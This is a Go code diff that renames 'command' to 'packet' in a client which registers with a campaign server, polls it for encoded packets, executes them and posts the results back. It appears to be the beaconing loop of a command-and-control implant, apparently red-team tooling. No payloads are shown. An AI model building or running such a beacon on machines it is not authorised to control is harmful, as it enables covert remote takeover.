@@ -13,7 +13,7 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
-var ErrNoCommandsFound = errors.New("Server did not return any commands")
+var ErrNoPacketsFound = errors.New("Server did not return any packets")
 
 type Client struct {
 	Config   ClientConfig
@@ -37,12 +37,12 @@ func NewClient() Client {
 	return w
 }
 
-func (s *Client) CommandGetUrl() string {
-	return s.Campaign.ServerUrl + s.Campaign.CommandGetPath + s.Config.ComputerId
+func (s *Client) PacketGetUrl() string {
+	return s.Campaign.ServerUrl + s.Campaign.PacketGetPath + s.Config.ComputerId
 }
 
-func (s *Client) CommandSendUrl() string {
-	return s.Campaign.ServerUrl + s.Campaign.CommandSendPath
+func (s *Client) PacketSendUrl() string {
+	return s.Campaign.ServerUrl + s.Campaign.PacketSendPath
 }
 
 func (s *Client) HttpGet(url string) (*http.Response, error) {
@@ -76,8 +76,8 @@ func (s *Client) HttpPost(url string, data *bytes.Reader) (*http.Response, error
 func (s *Client) Start() {
 	s.sendPing()
 	for {
-		gotCommand := s.requestAndExecute()
-		if !gotCommand {
+		gotPacket := s.requestAndExecute()
+		if !gotPacket {
 			time.Sleep(3 * time.Second)
 		}
 	}
@@ -87,46 +87,46 @@ func (s *Client) sendPing() {
 	arguments := make(model.PacketArgument)
 	arguments["msg"] = "ooy!"
 	response := make(model.PacketResponse)
-	command := model.NewCommand("ping", s.Config.ComputerId, "0", arguments, response)
-	s.sendCommand(command)
+	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)
+	s.sendPacket(packet)
 }
 
 func (s *Client) requestAndExecute() bool {
-	command, err := s.GetCommand()
+	packet, err := s.GetPacket()
 	if err != nil {
-		if err == ErrNoCommandsFound {
+		if err == ErrNoPacketsFound {
 			fmt.Print(".")
 			return false // no news, sleep
 		}
 
 		log.WithFields(log.Fields{
 			"error": err,
-		}).Debug("Error get command")
-		return false // if there is a broken command on server, dont flood him
+		}).Debug("Error get packet")
+		return false // if there is a broken packet on server, dont flood him
 	}
 
-	err = s.packetExecutor.execute(&command)
+	err = s.packetExecutor.execute(&packet)
 	if err != nil {
 		log.WithFields(log.Fields{
-			"command": command,
-			"error":   err,
-		}).Info("Error executing command")
-		return true // we still got a command
+			"packet": packet,
+			"error":  err,
+		}).Info("Error executing packet")
+		return true // we still got a packet
 	}
 
-	err = s.sendCommand(command)
+	err = s.sendPacket(packet)
 	if err != nil {
 		log.WithFields(log.Fields{
-			"command": command,
-			"error":   err,
-		}).Info("Error sending command")
-		return true // we still got a command
+			"packet": packet,
+			"error":  err,
+		}).Info("Error sending packet")
+		return true // we still got a packet
 	}
-	return true // got a command
+	return true // got a packet
 }
 
-func (s *Client) GetCommand() (model.Packet, error) {
-	url := s.CommandGetUrl()
+func (s *Client) GetPacket() (model.Packet, error) {
+	url := s.PacketGetUrl()
 	resp, err := s.HttpGet(url)
 	if err != nil {
 		return model.Packet{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
@@ -141,30 +141,30 @@ func (s *Client) GetCommand() (model.Packet, error) {
 	}
 
 	if len(bodyBytes) <= 0 {
-		return model.Packet{}, ErrNoCommandsFound
+		return model.Packet{}, ErrNoPacketsFound
 	}
-	command, err := s.coder.DecodeData(bodyBytes)
+	packet, err := s.coder.DecodeData(bodyBytes)
 	if err != nil {
 		return model.Packet{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
 	}
-	return command, nil
+	return packet, nil
 }
 
-func (s *Client) sendCommand(command model.Packet) error {
-	url := s.CommandSendUrl()
+func (s *Client) sendPacket(packet model.Packet) error {
+	url := s.PacketSendUrl()
 
 	// Setup response
-	command.ComputerId = s.Config.ComputerId
-	json, err := json.Marshal(command)
+	packet.ComputerId = s.Config.ComputerId
+	json, err := json.Marshal(packet)
 	if err != nil {
 		return err
 	}
 
 	log.WithFields(log.Fields{
-		"command": string(json),
-	}).Info("Send Command")
+		"packet": string(json),
+	}).Info("Send Packet")
 
-	data, err := s.coder.EncodeData(command)
+	data, err := s.coder.EncodeData(packet)
 	if err != nil {
 		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
 	}
